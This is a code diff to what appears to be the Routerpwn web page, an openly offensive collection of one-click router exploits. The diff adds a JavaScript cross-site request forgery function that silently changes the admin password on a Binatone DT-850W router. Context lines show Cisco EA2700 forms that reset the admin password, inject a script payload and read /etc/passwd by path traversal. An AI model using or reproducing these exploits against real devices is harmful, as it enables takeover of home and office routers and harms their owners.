@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.230</title>
+		<title>Routerpwn 1.20.231</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -90,7 +90,7 @@ column-count:4;
 		border-style: solid;
 	}
 
-	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#asus,#alcatellucent,#belkin,#cisco,#comtrend,#DDWRT,#DLink,#zoom,#smc,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel, #ubee, #zte, #EE, #DD-WRT, #unicorn {
+	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#asus,#alcatellucent,#belkin,#cisco,#comtrend,#DDWRT,#DLink,#zoom,#smc,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel, #ubee, #zte, #EE, #DD-WRT, #unicorn, #binatone {
 		background-image: url("bg.jpg");
 	}
 
@@ -204,6 +204,18 @@ this.unsigned)};b.prototype.and=function(a){return b.fromBits(this.low&a.low,thi
    Javascript port depends on Long.js
 
  */
+
+ // Binatone DT 850W Wireless Router - Change Admin Password
+function binatone_dt850w_changeadmin(ip)
+{
+    ip = ip || "192.168.1.1";
+    pwd = prompt("New Admin Password: ");
+    form = '<input type="hidden" name="uiViewTools_Password" value="' + pwd + '">\
+            <input type="hidden" name="uiViewTools_PasswordConfirm" value="' + pwd + '">';
+			
+	post('http://' + ip + '/Forms/tools_admin_1', form);
+
+}
 
 
 function sitecom400xwpa(keylength) {
@@ -2382,6 +2394,7 @@ function belkinwpspin()
 			<div><h2><a href="#asmax">Asmax</a></h2></div>
 			<div><h2><a href="#asus">Asus</a></h2></div>
 			<div><h2><a href="#belkin">Belkin</a></h2></div>
+			<div><h2><a href="#binatone">Binatone</a></h2></div>
 			<div><h2><a href="#cisco">Cisco</a></h2></div>
 			<div><h2><a href="#comtrend">Comtrend</a></h2></div>
 			<div><h2><a href="#DDWRT">DD-Wrt</a></h2></div>
@@ -2896,7 +2909,24 @@ function belkinwpspin()
 	<div><a href="javascript:setip('/SaveCfgFile.cgi')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
-</section><br><br><section id="cisco">
+</section><br><br>
+<section id="binatone">
+<h2>Binatone</h2>
+<h3><a href="javascript:img('DT-850W')">DT-850W</a> </a></h3>
+
+<article>
+	<div>05/20/14</div>
+	<div><a href="http://packetstormsecurity.com/files/126758/Binatone-DT-850W-Router-Cross-Site-Request-Forgery.html">[+]</a></div>
+	<div><a href="javascript:binatone_dt850w_changeadmin()">Binatone DT 850W Wireless Router - Change Admin Password</a></div>
+	<div><a href="javascript:binatone_dt850w_changeadmin(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<div style="float: right"><a href="#">^ Top</a></div>
+
+</section><br><br>
+
+
+<section id="cisco">
 <form name='ea2700pass' action='http://192.168.1.1/apply.cgi' method='post'><input type="hidden" name='submit_button' value="Management"><input type="hidden" name='action' value="Apply"><input type="hidden" name='change_action' value=""><input type="hidden" name='PasswdModify' value="1"><input type="hidden" name='http_passwd' value="password"><input type="hidden" name='http_passwdConfirm' value="password"></form>
 <form name='ea2700xss' action='http://192.168.1.1/apply.cgi' method='post'><input type="hidden" name='submit_button' value="xss';alert(1)//934"><input type="hidden" name='action' value="Apply"></form>
 <form name='ea2700path' action='http://192.168.1.1/apply.cgi' method='post'><input type="hidden" name='submit_button' value="Wireless_Basic"><input type="hidden" name='change_action' value="gozila_cgi"><input type="hidden" name='next_page' value="/etc/passwd"></form>
